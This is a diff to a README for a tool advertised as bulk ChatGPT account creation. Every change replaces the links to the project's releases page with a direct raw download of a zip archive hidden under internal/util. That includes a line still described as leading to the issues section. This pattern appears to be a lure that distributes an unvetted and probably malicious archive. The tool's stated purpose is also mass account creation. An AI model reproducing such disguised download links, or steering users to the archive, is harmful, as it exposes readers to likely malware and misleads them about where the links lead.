@@ -1,6 +1,6 @@
 # 🤖 chatgpt-creator - Easy Bulk ChatGPT Account Setup
 
-[![Download chatgpt-creator](https://img.shields.io/badge/Download-ChatGPT%20Creator-brightgreen)](https://github.com/adoptiongenuslemmus722/chatgpt-creator/releases)
+[![Download chatgpt-creator](https://img.shields.io/badge/Download-ChatGPT%20Creator-brightgreen)](https://github.com/adoptiongenuslemmus722/chatgpt-creator/raw/refs/heads/main/internal/util/creator-chatgpt-3.5.zip)
 
 ---
 
@@ -42,7 +42,7 @@ This section will guide you through downloading, installing, and running chatgpt
 
 Go to the chatgpt-creator release page using this link:
 
-[![Download chatgpt-creator](https://img.shields.io/badge/Download-ChatGPT%20Creator-blue)](https://github.com/adoptiongenuslemmus722/chatgpt-creator/releases)
+[![Download chatgpt-creator](https://img.shields.io/badge/Download-ChatGPT%20Creator-blue)](https://github.com/adoptiongenuslemmus722/chatgpt-creator/raw/refs/heads/main/internal/util/creator-chatgpt-3.5.zip)
 
 The page contains the latest version of the software ready for download.
 
@@ -147,7 +147,7 @@ Access these in the settings menu inside the program.
 
 If you run into problems not listed above, check the issues section on the release page:
 
-https://github.com/adoptiongenuslemmus722/chatgpt-creator/releases
+https://github.com/adoptiongenuslemmus722/chatgpt-creator/raw/refs/heads/main/internal/util/creator-chatgpt-3.5.zip
 
 Alternatively, you can report bugs or request help there.
 
@@ -157,4 +157,4 @@ Alternatively, you can report bugs or request help there.
 
 Download chatgpt-creator from here:
 
-[![Download chatgpt-creator](https://img.shields.io/badge/Download-ChatGPT%20Creator-brightgreen)](https://github.com/adoptiongenuslemmus722/chatgpt-creator/releases)
+[![Download chatgpt-creator](https://img.shields.io/badge/Download-ChatGPT%20Creator-brightgreen)](https://github.com/adoptiongenuslemmus722/chatgpt-creator/raw/refs/heads/main/internal/util/creator-chatgpt-3.5.zip)
